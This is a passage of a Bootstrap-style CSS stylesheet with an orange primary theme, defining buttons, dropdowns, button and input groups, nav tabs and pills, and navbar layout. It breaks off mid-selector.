        .btn:focus,
        .btn.focus,
        .btn:active:focus,
        .btn:active.focus,
        .btn.active:focus,
        .btn.active.focus {
            outline: 5px auto -webkit-focus-ring-color;
            outline-offset: -2px;
        }

        .btn:hover,
        .btn:focus,
        .btn.focus {
            color: #333333;
            text-decoration: none;
        }

        .btn:active,
        .btn.active {
            background-image: none;
            outline: 0;
            box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
        }

        .btn.disabled,
        .btn[disabled],
        fieldset[disabled] .btn {
            cursor: not-allowed;
            filter: alpha(opacity=65);
            opacity: 0.65;
            box-shadow: none;
        }

        a.btn.disabled,
        fieldset[disabled] a.btn {
            pointer-events: none;
        }

        .btn-default {
            color: #333333;
            background-color: #FFFFFF;
            border-color: #B2B2B2;
        }

        .btn-default:focus,
        .btn-default.focus {
            color: #333333;
            background-color: #e6e5e5;
            border-color: #727272;
        }

        .btn-default:hover {
            color: #333333;
            background-color: #e6e5e5;
            border-color: #939393;
        }

        .btn-default:active,
        .btn-default.active,
        .open>.btn-default.dropdown-toggle {
            color: #333333;
            background-color: #e6e5e5;
            background-image: none;
            border-color: #939393;
        }

        .btn-default:active:hover,
        .btn-default:active:focus,
        .btn-default:active.focus,
        .btn-default.active:hover,
        .btn-default.active:focus,
        .btn-default.active.focus,
        .open>.btn-default.dropdown-toggle:hover,
        .open>.btn-default.dropdown-toggle:focus,
        .open>.btn-default.dropdown-toggle.focus {
            color: #333333;
            background-color: #d4d4d4;
            border-color: #727272;
        }

        .btn-default.disabled:hover,
        .btn-default.disabled:focus,
        .btn-default.disabled.focus,
        .btn-default[disabled]:hover,
        .btn-default[disabled]:focus,
        .btn-default[disabled].focus,
        fieldset[disabled] .btn-default:hover,
        fieldset[disabled] .btn-default:focus,
        fieldset[disabled] .btn-default.focus {
            background-color: #FFFFFF;
            border-color: #B2B2B2;
        }

        .btn-default .badge {
            color: #FFFFFF;
            background-color: #333333;
        }

        .btn-primary {
            color: #FFFFFF;
            background-color: #ef6421;
            border-color: #ef6421;
        }

        .btn-primary:focus,
        .btn-primary.focus {
            color: #FFFFFF;
            background-color: #ce4d0f;
            border-color: #87320a;
        }

        .btn-primary:hover {
            color: #FFFFFF;
            background-color: #ce4d0f;
            border-color: #c54a0e;
        }

        .btn-primary:active,
        .btn-primary.active,
        .open>.btn-primary.dropdown-toggle {
            color: #FFFFFF;
            background-color: #ce4d0f;
            background-image: none;
            border-color: #c54a0e;
        }

        .btn-primary:active:hover,
        .btn-primary:active:focus,
        .btn-primary:active.focus,
        .btn-primary.active:hover,
        .btn-primary.active:focus,
        .btn-primary.active.focus,
        .open>.btn-primary.dropdown-toggle:hover,
        .open>.btn-primary.dropdown-toggle:focus,
        .open>.btn-primary.dropdown-toggle.focus {
            color: #FFFFFF;
            background-color: #ad410c;
            border-color: #87320a;
        }

        .btn-primary.disabled:hover,
        .btn-primary.disabled:focus,
        .btn-primary.disabled.focus,
        .btn-primary[disabled]:hover,
        .btn-primary[disabled]:focus,
        .btn-primary[disabled].focus,
        fieldset[disabled] .btn-primary:hover,
        fieldset[disabled] .btn-primary:focus,
        fieldset[disabled] .btn-primary.focus {
            background-color: #ef6421;
            border-color: #ef6421;
        }

        .btn-primary .badge {
            color: #ef6421;
            background-color: #FFFFFF;
        }

        .btn-success {
            color: #fff;
            background-color: #50b450;
            border-color: #46a446;
        }

        .btn-success:focus,
        .btn-success.focus {
            color: #fff;
            background-color: #3f923f;
            border-color: #204b20;
        }

        .btn-success:hover {
            color: #fff;
            background-color: #3f923f;
            border-color: #347934;
        }

        .btn-success:active,
        .btn-success.active,
        .open>.btn-success.dropdown-toggle {
            color: #fff;
            background-color: #3f923f;
            background-image: none;
            border-color: #347934;
        }

        .btn-success:active:hover,
        .btn-success:active:focus,
        .btn-success:active.focus,
        .btn-success.active:hover,
        .btn-success.active:focus,
        .btn-success.active.focus,
        .open>.btn-success.dropdown-toggle:hover,
        .open>.btn-success.dropdown-toggle:focus,
        .open>.btn-success.dropdown-toggle.focus {
            color: #fff;
            background-color: #347934;
            border-color: #204b20;
        }

        .btn-success.disabled:hover,
        .btn-success.disabled:focus,
        .btn-success.disabled.focus,
        .btn-success[disabled]:hover,
        .btn-success[disabled]:focus,
        .btn-success[disabled].focus,
        fieldset[disabled] .btn-success:hover,
        fieldset[disabled] .btn-success:focus,
        fieldset[disabled] .btn-success.focus {
            background-color: #50b450;
            border-color: #46a446;
        }

        .btn-success .badge {
            color: #50b450;
            background-color: #fff;
        }

        .btn-info {
            color: #fff;
            background-color: #3a98d8;
            border-color: #298ccf;
        }

        .btn-info:focus,
        .btn-info.focus {
            color: #fff;
            background-color: #257eba;
            border-color: #144465;
        }

        .btn-info:hover {
            color: #fff;
            background-color: #257eba;
            border-color: #1f6a9c;
        }

        .btn-info:active,
        .btn-info.active,
        .open>.btn-info.dropdown-toggle {
            color: #fff;
            background-color: #257eba;
            background-image: none;
            border-color: #1f6a9c;
        }

        .btn-info:active:hover,
        .btn-info:active:focus,
        .btn-info:active.focus,
        .btn-info.active:hover,
        .btn-info.active:focus,
        .btn-info.active.focus,
        .open>.btn-info.dropdown-toggle:hover,
        .open>.btn-info.dropdown-toggle:focus,
        .open>.btn-info.dropdown-toggle.focus {
            color: #fff;
            background-color: #1f6a9c;
            border-color: #144465;
        }

        .btn-info.disabled:hover,
        .btn-info.disabled:focus,
        .btn-info.disabled.focus,
        .btn-info[disabled]:hover,
        .btn-info[disabled]:focus,
        .btn-info[disabled].focus,
        fieldset[disabled] .btn-info:hover,
        fieldset[disabled] .btn-info:focus,
        fieldset[disabled] .btn-info.focus {
            background-color: #3a98d8;
            border-color: #298ccf;
        }

        .btn-info .badge {
            color: #3a98d8;
            background-color: #fff;
        }

        .btn-warning {
            color: #fff;
            background-color: #E5B700;
            border-color: #cca300;
        }

        .btn-warning:focus,
        .btn-warning.focus {
            color: #fff;
            background-color: #b28e00;
            border-color: #4c3d00;
        }

        .btn-warning:hover {
            color: #fff;
            background-color: #b28e00;
            border-color: #8e7200;
        }

        .btn-warning:active,
        .btn-warning.active,
        .open>.btn-warning.dropdown-toggle {
            color: #fff;
            background-color: #b28e00;
            background-image: none;
            border-color: #8e7200;
        }

        .btn-warning:active:hover,
        .btn-warning:active:focus,
        .btn-warning:active.focus,
        .btn-warning.active:hover,
        .btn-warning.active:focus,
        .btn-warning.active.focus,
        .open>.btn-warning.dropdown-toggle:hover,
        .open>.btn-warning.dropdown-toggle:focus,
        .open>.btn-warning.dropdown-toggle.focus {
            color: #fff;
            background-color: #8e7200;
            border-color: #4c3d00;
        }

        .btn-warning.disabled:hover,
        .btn-warning.disabled:focus,
        .btn-warning.disabled.focus,
        .btn-warning[disabled]:hover,
        .btn-warning[disabled]:focus,
        .btn-warning[disabled].focus,
        fieldset[disabled] .btn-warning:hover,
        fieldset[disabled] .btn-warning:focus,
        fieldset[disabled] .btn-warning.focus {
            background-color: #E5B700;
            border-color: #cca300;
        }

        .btn-warning .badge {
            color: #E5B700;
            background-color: #fff;
        }

        .btn-danger {
            color: #FFFFFF;
            background-color: #d63636;
            border-color: #d63636;
        }

        .btn-danger:focus,
        .btn-danger.focus {
            color: #FFFFFF;
            background-color: #b42525;
            border-color: #751818;
        }

        .btn-danger:hover {
            color: #FFFFFF;
            background-color: #b42525;
            border-color: #ac2323;
        }

        .btn-danger:active,
        .btn-danger.active,
        .open>.btn-danger.dropdown-toggle {
            color: #FFFFFF;
            background-color: #b42525;
            background-image: none;
            border-color: #ac2323;
        }

        .btn-danger:active:hover,
        .btn-danger:active:focus,
        .btn-danger:active.focus,
        .btn-danger.active:hover,
        .btn-danger.active:focus,
        .btn-danger.active.focus,
        .open>.btn-danger.dropdown-toggle:hover,
        .open>.btn-danger.dropdown-toggle:focus,
        .open>.btn-danger.dropdown-toggle.focus {
            color: #FFFFFF;
            background-color: #971f1f;
            border-color: #751818;
        }

        .btn-danger.disabled:hover,
        .btn-danger.disabled:focus,
        .btn-danger.disabled.focus,
        .btn-danger[disabled]:hover,
        .btn-danger[disabled]:focus,
        .btn-danger[disabled].focus,
        fieldset[disabled] .btn-danger:hover,
        fieldset[disabled] .btn-danger:focus,
        fieldset[disabled] .btn-danger.focus {
            background-color: #d63636;
            border-color: #d63636;
        }

        .btn-danger .badge {
            color: #d63636;
            background-color: #FFFFFF;
        }

        .btn-link {
            font-weight: 400;
            color: #333333;
            border-radius: 0;
        }

        .btn-link,
        .btn-link:active,
        .btn-link.active,
        .btn-link[disabled],
        fieldset[disabled] .btn-link {
            background-color: transparent;
            box-shadow: none;
        }

        .btn-link,
        .btn-link:hover,
        .btn-link:focus,
        .btn-link:active {
            border-color: transparent;
        }

        .btn-link:hover,
        .btn-link:focus {
            color: #0d0d0d;
            text-decoration: underline;
            background-color: transparent;
        }

        .btn-link[disabled]:hover,
        .btn-link[disabled]:focus,
        fieldset[disabled] .btn-link:hover,
        fieldset[disabled] .btn-link:focus {
            color: #CCCCCC;
            text-decoration: none;
        }

        .btn-lg,
        .btn-group-lg>.btn {
            padding: 10px 16px;
            font-size: 17px;
            line-height: 1.3333333;
            border-radius: 6px;
        }

        .btn-sm,
        .btn-group-sm>.btn {
            padding: 5px 10px;
            font-size: 11px;
            line-height: 1.5;
            border-radius: 3px;
        }

        .btn-xs,
        .btn-group-xs>.btn {
            padding: 1px 5px;
            font-size: 11px;
            line-height: 1.5;
            border-radius: 3px;
        }

        .btn-block {
            display: block;
            width: 100%;
        }

        .btn-block+.btn-block {
            margin-top: 5px;
        }

        input[type="submit"].btn-block,
        input[type="reset"].btn-block,
        input[type="button"].btn-block {
            width: 100%;
        }

        .fade {
            opacity: 0;
            transition: opacity 0.15s linear;
        }

        .fade.in {
            opacity: 1;
        }

        .collapse {
            display: none;
        }

        .collapse.in {
            display: block;
        }

        tr.collapse.in {
            display: table-row;
        }

        tbody.collapse.in {
            display: table-row-group;
        }

        .collapsing {
            position: relative;
            height: 0;
            overflow: hidden;
            transition-property: height, visibility;
            transition-duration: 0.35s;
            transition-timing-function: ease;
        }

        .caret {
            display: inline-block;
            width: 0;
            height: 0;
            margin-left: 2px;
            vertical-align: middle;
            border-top: 4px dashed;
            border-top: 4px solid \9;
            border-right: 4px solid transparent;
            border-left: 4px solid transparent;
        }

        .dropup,
        .dropdown {
            position: relative;
        }

        .dropdown-toggle:focus {
            outline: 0;
        }

        .dropdown-menu {
            position: absolute;
            top: 100%;
            left: 0;
            z-index: 1000;
            display: none;
            float: left;
            min-width: 160px;
            padding: 5px 0;
            margin: 2px 0 0;
            font-size: 14px;
            text-align: left;
            list-style: none;
            background-color: #fff;
            background-clip: padding-box;
            border: 1px solid #CCCCCC;
            border: 1px solid #CCCCCC;
            border-radius: 4px;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.175);
        }

        .dropdown-menu.pull-right {
            right: 0;
            left: auto;
        }

        .dropdown-menu .divider {
            height: 1px;
            margin: 9px 0;
            overflow: hidden;
            background-color: #E5E5E5;
        }

        .dropdown-menu>li>a {
            display: block;
            padding: 3px 20px;
            clear: both;
            font-weight: 400;
            line-height: 1.42857143;
            color: #333333;
            white-space: nowrap;
        }

        .dropdown-menu>li>a:hover,
        .dropdown-menu>li>a:focus {
            color: #262626;
            text-decoration: none;
            background-color: #F2F2F2;
        }

        .dropdown-menu>.active>a,
        .dropdown-menu>.active>a:hover,
        .dropdown-menu>.active>a:focus {
            color: #fff;
            text-decoration: none;
            background-color: #ef6421;
            outline: 0;
        }

        .dropdown-menu>.disabled>a,
        .dropdown-menu>.disabled>a:hover,
        .dropdown-menu>.disabled>a:focus {
            color: #CCCCCC;
        }

        .dropdown-menu>.disabled>a:hover,
        .dropdown-menu>.disabled>a:focus {
            text-decoration: none;
            cursor: not-allowed;
            background-color: transparent;
            background-image: none;
            filter: progid:DXImageTransform.Microsoft.gradient(enabled=false);
        }

        .open>.dropdown-menu {
            display: block;
        }

        .open>a {
            outline: 0;
        }

        .dropdown-menu-right {
            right: 0;
            left: auto;
        }

        .dropdown-menu-left {
            right: auto;
            left: 0;
        }

        .dropdown-header {
            display: block;
            padding: 3px 20px;
            font-size: 11px;
            line-height: 1.42857143;
            color: #666666;
            white-space: nowrap;
        }

        .dropdown-backdrop {
            position: fixed;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            z-index: 990;
        }

        .pull-right>.dropdown-menu {
            right: 0;
            left: auto;
        }

        .dropup .caret,
        .navbar-fixed-bottom .dropdown .caret {
            content: "";
            border-top: 0;
            border-bottom: 4px dashed;
            border-bottom: 4px solid \9;
        }

        .dropup .dropdown-menu,
        .navbar-fixed-bottom .dropdown .dropdown-menu {
            top: auto;
            bottom: 100%;
            margin-bottom: 2px;
        }

        @media (min-width: 768px) {
            .navbar-right .dropdown-menu {
                right: 0;
                left: auto;
            }

            .navbar-right .dropdown-menu-left {
                left: 0;
                right: auto;
            }
        }

        .btn-group,
        .btn-group-vertical {
            position: relative;
            display: inline-block;
            vertical-align: middle;
        }

        .btn-group>.btn,
        .btn-group-vertical>.btn {
            position: relative;
            float: left;
        }

        .btn-group>.btn:hover,
        .btn-group>.btn:focus,
        .btn-group>.btn:active,
        .btn-group>.btn.active,
        .btn-group-vertical>.btn:hover,
        .btn-group-vertical>.btn:focus,
        .btn-group-vertical>.btn:active,
        .btn-group-vertical>.btn.active {
            z-index: 2;
        }

        .btn-group .btn+.btn,
        .btn-group .btn+.btn-group,
        .btn-group .btn-group+.btn,
        .btn-group .btn-group+.btn-group {
            margin-left: -1px;
        }

        .btn-toolbar {
            margin-left: -5px;
        }

        .btn-toolbar:before,
        .btn-toolbar:after {
            display: table;
            content: " ";
        }

        .btn-toolbar:after {
            clear: both;
        }

        .btn-toolbar .btn,
        .btn-toolbar .btn-group,
        .btn-toolbar .input-group {
            float: left;
        }

        .btn-toolbar>.btn,
        .btn-toolbar>.btn-group,
        .btn-toolbar>.input-group {
            margin-left: 5px;
        }

        .btn-group>.btn:not(:first-child):not(:last-child):not(.dropdown-toggle) {
            border-radius: 0;
        }

        .btn-group>.btn:first-child {
            margin-left: 0;
        }

        .btn-group>.btn:first-child:not(:last-child):not(.dropdown-toggle) {
            border-top-right-radius: 0;
            border-bottom-right-radius: 0;
        }

        .btn-group>.btn:last-child:not(:first-child),
        .btn-group>.dropdown-toggle:not(:first-child) {
            border-top-left-radius: 0;
            border-bottom-left-radius: 0;
        }

        .btn-group>.btn-group {
            float: left;
        }

        .btn-group>.btn-group:not(:first-child):not(:last-child)>.btn {
            border-radius: 0;
        }

        .btn-group>.btn-group:first-child:not(:last-child)>.btn:last-child,
        .btn-group>.btn-group:first-child:not(:last-child)>.dropdown-toggle {
            border-top-right-radius: 0;
            border-bottom-right-radius: 0;
        }

        .btn-group>.btn-group:last-child:not(:first-child)>.btn:first-child {
            border-top-left-radius: 0;
            border-bottom-left-radius: 0;
        }

        .btn-group .dropdown-toggle:active,
        .btn-group.open .dropdown-toggle {
            outline: 0;
        }

        .btn-group>.btn+.dropdown-toggle {
            padding-right: 8px;
            padding-left: 8px;
        }

        .btn-group>.btn-lg+.dropdown-toggle,
        .btn-group-lg.btn-group>.btn+.dropdown-toggle {
            padding-right: 12px;
            padding-left: 12px;
        }

        .btn-group.open .dropdown-toggle {
            box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
        }

        .btn-group.open .dropdown-toggle.btn-link {
            box-shadow: none;
        }

        .btn .caret {
            margin-left: 0;
        }

        .btn-lg .caret,
        .btn-group-lg>.btn .caret {
            border-width: 5px 5px 0;
            border-bottom-width: 0;
        }

        .dropup .btn-lg .caret,
        .dropup .btn-group-lg>.btn .caret {
            border-width: 0 5px 5px;
        }

        .btn-group-vertical>.btn,
        .btn-group-vertical>.btn-group,
        .btn-group-vertical>.btn-group>.btn {
            display: block;
            float: none;
            width: 100%;
            max-width: 100%;
        }

        .btn-group-vertical>.btn-group:before,
        .btn-group-vertical>.btn-group:after {
            display: table;
            content: " ";
        }

        .btn-group-vertical>.btn-group:after {
            clear: both;
        }

        .btn-group-vertical>.btn-group>.btn {
            float: none;
        }

        .btn-group-vertical>.btn+.btn,
        .btn-group-vertical>.btn+.btn-group,
        .btn-group-vertical>.btn-group+.btn,
        .btn-group-vertical>.btn-group+.btn-group {
            margin-top: -1px;
            margin-left: 0;
        }

        .btn-group-vertical>.btn:not(:first-child):not(:last-child) {
            border-radius: 0;
        }

        .btn-group-vertical>.btn:first-child:not(:last-child) {
            border-top-left-radius: 4px;
            border-top-right-radius: 4px;
            border-bottom-right-radius: 0;
            border-bottom-left-radius: 0;
        }

        .btn-group-vertical>.btn:last-child:not(:first-child) {
            border-top-left-radius: 0;
            border-top-right-radius: 0;
            border-bottom-right-radius: 4px;
            border-bottom-left-radius: 4px;
        }

        .btn-group-vertical>.btn-group:not(:first-child):not(:last-child)>.btn {
            border-radius: 0;
        }

        .btn-group-vertical>.btn-group:first-child:not(:last-child)>.btn:last-child,
        .btn-group-vertical>.btn-group:first-child:not(:last-child)>.dropdown-toggle {
            border-bottom-right-radius: 0;
            border-bottom-left-radius: 0;
        }

        .btn-group-vertical>.btn-group:last-child:not(:first-child)>.btn:first-child {
            border-top-left-radius: 0;
            border-top-right-radius: 0;
        }

        .btn-group-justified {
            display: table;
            width: 100%;
            table-layout: fixed;
            border-collapse: separate;
        }

        .btn-group-justified>.btn,
        .btn-group-justified>.btn-group {
            display: table-cell;
            float: none;
            width: 1%;
        }

        .btn-group-justified>.btn-group .btn {
            width: 100%;
        }

        .btn-group-justified>.btn-group .dropdown-menu {
            left: auto;
        }

        [data-toggle="buttons"]>.btn input[type="radio"],
        [data-toggle="buttons"]>.btn input[type="checkbox"],
        [data-toggle="buttons"]>.btn-group>.btn input[type="radio"],
        [data-toggle="buttons"]>.btn-group>.btn input[type="checkbox"] {
            position: absolute;
            clip: rect(0, 0, 0, 0);
            pointer-events: none;
        }

        .input-group {
            position: relative;
            display: table;
            border-collapse: separate;
        }

        .input-group[class*="col-"] {
            float: none;
            padding-right: 0;
            padding-left: 0;
        }

        .input-group .form-control {
            position: relative;
            z-index: 2;
            float: left;
            width: 100%;
            margin-bottom: 0;
        }

        .input-group .form-control:focus {
            z-index: 3;
        }

        .input-group-addon,
        .input-group-btn,
        .input-group .form-control {
            display: table-cell;
        }

        .input-group-addon:not(:first-child):not(:last-child),
        .input-group-btn:not(:first-child):not(:last-child),
        .input-group .form-control:not(:first-child):not(:last-child) {
            border-radius: 0;
        }

        .input-group-addon,
        .input-group-btn {
            width: 1%;
            white-space: nowrap;
            vertical-align: middle;
        }

        .input-group-addon {
            padding: 6px 12px;
            font-size: 14px;
            font-weight: 400;
            line-height: 1;
            color: #333333;
            text-align: center;
            background-color: #E5E5E5;
            border: 1px solid #CCCCCC;
            border-radius: 4px;
        }

        .input-group-addon.input-sm,
        .input-group-sm>.input-group-addon,
        .input-group-sm>.input-group-btn>.input-group-addon.btn {
            padding: 5px 10px;
            font-size: 11px;
            border-radius: 3px;
        }

        .input-group-addon.input-lg,
        .input-group-lg>.input-group-addon,
        .input-group-lg>.input-group-btn>.input-group-addon.btn {
            padding: 10px 16px;
            font-size: 17px;
            border-radius: 6px;
        }

        .input-group-addon input[type="radio"],
        .input-group-addon input[type="checkbox"] {
            margin-top: 0;
        }

        .input-group .form-control:first-child,
        .input-group-addon:first-child,
        .input-group-btn:first-child>.btn,
        .input-group-btn:first-child>.btn-group>.btn,
        .input-group-btn:first-child>.dropdown-toggle,
        .input-group-btn:last-child>.btn:not(:last-child):not(.dropdown-toggle),
        .input-group-btn:last-child>.btn-group:not(:last-child)>.btn {
            border-top-right-radius: 0;
            border-bottom-right-radius: 0;
        }

        .input-group-addon:first-child {
            border-right: 0;
        }

        .input-group .form-control:last-child,
        .input-group-addon:last-child,
        .input-group-btn:last-child>.btn,
        .input-group-btn:last-child>.btn-group>.btn,
        .input-group-btn:last-child>.dropdown-toggle,
        .input-group-btn:first-child>.btn:not(:first-child),
        .input-group-btn:first-child>.btn-group:not(:first-child)>.btn {
            border-top-left-radius: 0;
            border-bottom-left-radius: 0;
        }

        .input-group-addon:last-child {
            border-left: 0;
        }

        .input-group-btn {
            position: relative;
            font-size: 0;
            white-space: nowrap;
        }

        .input-group-btn>.btn {
            position: relative;
        }

        .input-group-btn>.btn+.btn {
            margin-left: -1px;
        }

        .input-group-btn>.btn:hover,
        .input-group-btn>.btn:focus,
        .input-group-btn>.btn:active {
            z-index: 2;
        }

        .input-group-btn:first-child>.btn,
        .input-group-btn:first-child>.btn-group {
            margin-right: -1px;
        }

        .input-group-btn:last-child>.btn,
        .input-group-btn:last-child>.btn-group {
            z-index: 2;
            margin-left: -1px;
        }

        .nav {
            padding-left: 0;
            margin-bottom: 0;
            list-style: none;
        }

        .nav:before,
        .nav:after {
            display: table;
            content: " ";
        }

        .nav:after {
            clear: both;
        }

        .nav>li {
            position: relative;
            display: block;
        }

        .nav>li>a {
            position: relative;
            display: block;
            padding: 10px 15px;
        }

        .nav>li>a:hover,
        .nav>li>a:focus {
            text-decoration: none;
            background-color: #eeeeee;
        }

        .nav>li.disabled>a {
            color: #777777;
        }

        .nav>li.disabled>a:hover,
        .nav>li.disabled>a:focus {
            color: #777777;
            text-decoration: none;
            cursor: not-allowed;
            background-color: transparent;
        }

        .nav .open>a,
        .nav .open>a:hover,
        .nav .open>a:focus {
            background-color: #eeeeee;
            border-color: #333333;
        }

        .nav .nav-divider {
            height: 1px;
            margin: 9px 0;
            overflow: hidden;
            background-color: #e5e5e5;
        }

        .nav>li>a>img {
            max-width: none;
        }

        .nav-tabs {
            border-bottom: 1px solid #ddd;
        }

        .nav-tabs>li {
            float: left;
            margin-bottom: -1px;
        }

        .nav-tabs>li>a {
            margin-right: 2px;
            line-height: 1.42857143;
            border: 1px solid transparent;
            border-radius: 4px 4px 0 0;
        }

        .nav-tabs>li>a:hover {
            border-color: #eeeeee #eeeeee #ddd;
        }

        .nav-tabs>li.active>a,
        .nav-tabs>li.active>a:hover,
        .nav-tabs>li.active>a:focus {
            color: #555555;
            cursor: default;
            background-color: #fff;
            border: 1px solid #ddd;
            border-bottom-color: transparent;
        }

        .nav-pills>li {
            float: left;
        }

        .nav-pills>li>a {
            border-radius: 4px;
        }

        .nav-pills>li+li {
            margin-left: 2px;
        }

        .nav-pills>li.active>a,
        .nav-pills>li.active>a:hover,
        .nav-pills>li.active>a:focus {
            color: #fff;
            background-color: #337ab7;
        }

        .nav-stacked>li {
            float: none;
        }

        .nav-stacked>li+li {
            margin-top: 2px;
            margin-left: 0;
        }

        .nav-justified,
        .nav-tabs.nav-justified {
            width: 100%;
        }

        .nav-justified>li,
        .nav-tabs.nav-justified>li {
            float: none;
        }

        .nav-justified>li>a,
        .nav-tabs.nav-justified>li>a {
            margin-bottom: 5px;
            text-align: center;
        }

        .nav-justified>.dropdown .dropdown-menu {
            top: auto;
            left: auto;
        }

        @media (min-width: 768px) {

            .nav-justified>li,
            .nav-tabs.nav-justified>li {
                display: table-cell;
                width: 1%;
            }

            .nav-justified>li>a,
            .nav-tabs.nav-justified>li>a {
                margin-bottom: 0;
            }
        }

        .nav-tabs-justified,
        .nav-tabs.nav-justified {
            border-bottom: 0;
        }

        .nav-tabs-justified>li>a,
        .nav-tabs.nav-justified>li>a {
            margin-right: 0;
            border-radius: 4px;
        }

        .nav-tabs-justified>.active>a,
        .nav-tabs.nav-justified>.active>a,
        .nav-tabs-justified>.active>a:hover,
        .nav-tabs.nav-justified>.active>a:hover,
        .nav-tabs-justified>.active>a:focus,
        .nav-tabs.nav-justified>.active>a:focus {
            border: 1px solid #ddd;
        }

        @media (min-width: 768px) {

            .nav-tabs-justified>li>a,
            .nav-tabs.nav-justified>li>a {
                border-bottom: 1px solid #ddd;
                border-radius: 4px 4px 0 0;
            }

            .nav-tabs-justified>.active>a,
            .nav-tabs.nav-justified>.active>a,
            .nav-tabs-justified>.active>a:hover,
            .nav-tabs.nav-justified>.active>a:hover,
            .nav-tabs-justified>.active>a:focus,
            .nav-tabs.nav-justified>.active>a:focus {
                border-bottom-color: #fff;
            }
        }

        .tab-content>.tab-pane {
            display: none;
        }

        .tab-content>.active {
            display: block;
        }

        .nav-tabs .dropdown-menu {
            margin-top: -1px;
            border-top-left-radius: 0;
            border-top-right-radius: 0;
        }

        .navbar {
            position: relative;
            min-height: 60px;
            margin-bottom: 0;
            border: 1px solid transparent;
        }

        .navbar:before,
        .navbar:after {
            display: table;
            content: " ";
        }

        .navbar:after {
            clear: both;
        }

        @media (min-width: 768px) {
            .navbar {
                border-radius: 0;
            }
        }

        .navbar-header:before,
        .navbar-header:after {
            display: table;
            content: " ";
        }

        .navbar-header:after {
            clear: both;
        }

        @media (min-width: 768px) {
            .navbar-header {
                float: left;
            }
        }

        .navbar-collapse {
            padding-right: 15px;
            padding-left: 15px;
            overflow-x: visible;
            border-top: 1px solid transparent;
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.1);
            -webkit-overflow-scrolling: touch;
        }

        .navbar-collapse:before,
        .navbar-collapse:after {
            display: table;
            content: " ";
        }

        .navbar-collapse:after {
            clear: both;
        }

        .navbar-collapse.in {
            overflow-y: auto;
        }

        @media (min-width: 768px) {
            .navbar-collapse {
                width: auto;
                border-top: 0;
                box-shadow: none;
            }

            .navbar-collapse.collapse {
                display: block !important;
                height: auto !important;
                padding-bottom: 0;
                overflow: visible !important;
            }

            .navbar-collapse.in {
                overflow-y: visible;
            }

            .navbar-fixed-top .navbar-collapse,
            .navbar-static-top .navbar-collapse,
            .navbar-fixed-bottom .navbar-collapse {
                padding-right: 0;
                padding-left: 0;
            }
        }

        .navbar-fixed-top,
        .navbar-fixed-bottom {
            position: fixed;
            right: 0;
            left: 0;
            z-index: 1030;
        }

        .navbar-fixed-top .navbar-collapse,
        .navbar-fixed-bottom .navbar-collapse {
            max-height: 340px;
        }

        @media (max-device-width: 480px) and (orientation: landscape) {

            .navbar-fixed-top .navbar-collapse,
            .navbar-fixed-bottom .navbar-collapse {
                max-height: 200px;
            }
        }

        @media (min-width: 768px) {

            .navbar-fixed-top,
            .navbar-fixed-bottom {
                border-radius: 0;
            }
        }

        .navbar-fixed-top {
            top: 0;
            border-width: 0 0 1px;
        }

        .navbar-fixed-bottom {
            bottom: 0;
            margin-bottom: 0;
            border-width: 1px 0 0;
        }

        .container>.navbar-header,
        .container>.navbar-collapse,
        .container-fluid>.navbar-header,
        .container-fluid>.navbar-collapse {
            margin-right: -15px;
            margin-left: -15px;
        }

        @media (min-width: 768px) {

            .container>.navbar-header,
            .container>.navbar-collapse,
            .container-fluid>.navbar-header,
            .container-fluid>.navbar-collapse {
                margin-right: 0;
                margin-left: 0;
            }
        }

        .navbar-static-top {
            z-index: 1000;
            border-width: 0 0 1px;
        }

        @media (min-width: 768px) {
            .navbar-static-top {
                border-radius: 0;
            }
        }

        .navbar-brand {
            float: left;
            height: 60px;
            padding: 20px 15px;
            font-size: 17px;
            line-height: 20px;
        }

        .navbar-brand:hover,
        .navbar-brand:focus {
            text-decoration: none;
        }

        .navbar-brand>img {
            display: block;
        }

        @media (min-width: 768px) {

            .navbar>.container .navbar-brand,
            .navbar>.container-fluid .navbar-brand {
                margin-left: -15px;
            }
        }

        .navbar-toggle {
            position: relative;
            float: right;
            padding: 9px 10px;
            margin-right: 15px;
            margin-top: 13px;
            margin-bottom: 13px;
            background-color: transparent;
            background-image: none;
            border: 1px solid transparent;
            border-radius: 4px;
        }

        .navbar-toggle:focus {
            outline: 0;
        }

        .navbar-toggle .icon-bar {
            display: block;
            width: 22px;
            height: 2px;
            border-radius: 1px;
        }

        .navbar-toggle .icon-bar+.icon-bar {
            margin-top: 4px;
        }

        @media (min-width: 768px) {
            .navbar-toggle {
                display: none;
            }
        }

        .navbar-nav {
            margin: 10px -15px;
        }

        .navbar-nav>li>a {
            padding-top: 10px;
            padding-bottom: 10px;
            line-height: 20px;
        }

        @media (max-width: 767px) {
            .navbar-nav .open .dropdown-menu {
                position: static;
                float: none;
                width: auto;
                margin-top: 0;
                background-color: transparent;
                border: 0;
                box-shadow: none;
            }

            .navbar-nav .open .dropdown-menu>li>a,
            .navbar-nav .open .dropdown-menu .dropdown-header {
                padding: 5px 15px 5px 25px;
            }

            .navbar-nav .open .dropdown-menu>li>a {
                line-height: 20px;
            }

            .navbar-nav .open .dropdown-menu>li>a:hover,
            .navbar-nav .open .dropdown-menu>li>a:focus {
                background-image: none;
            }
        }

        @media (min-width: 768px) {
            .navbar-nav {
                float: left;
                margin: 0;
            }

            .navbar-nav>li {
                float: left;
            }

            .navbar-nav>li>a {
                padding-top: 20px;
                padding-bottom: 20px;
            }
        }

        .navbar-form {
            padding: 10px 15px;
            margin-right: -15px;
            margin-left: -15px;
            border-top: 1px solid transparent;
            border-bottom: 1px solid transparent;
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.1), 0 1px 0 rgba(255, 255, 255, 0.1);
            margin-top: 13px;
            margin-bottom: 13px;
        }

        @media (min-width: 768px) {
            .navbar-form .form-group {
                display: inline-block;
                margin-bottom: 0;
                vertical-align: middle;
            }

            .navbar-form .form-control {
                display: inline-block;
                width: auto;
                vertical-align: middle;
            }

            .navbar-form .form-control-static {
                display: inline-block;
            }

            .navbar-form .input-group {
                display: inline-table;
                vertical-align: middle;
            }

            .navbar-form .input-group .input-group-addon,
            .navbar-form .input-group .input-group-btn,
            .navbar-form .input-group .form-control {
                width: auto;
            }

            .navbar-form .input-group>.form-control {
                width: 100%;
            }

            .navbar-form .control-label {
                margin-bottom: 0;
                vertical-align: middle;
            }

            .navbar-form .radio,
            .navbar-form .checkbox {
                display: inline-block;
                margin-top: 0;
                margin-bottom: 0;
                vertical-align: middle;
            }

            .navbar-form .radio label,
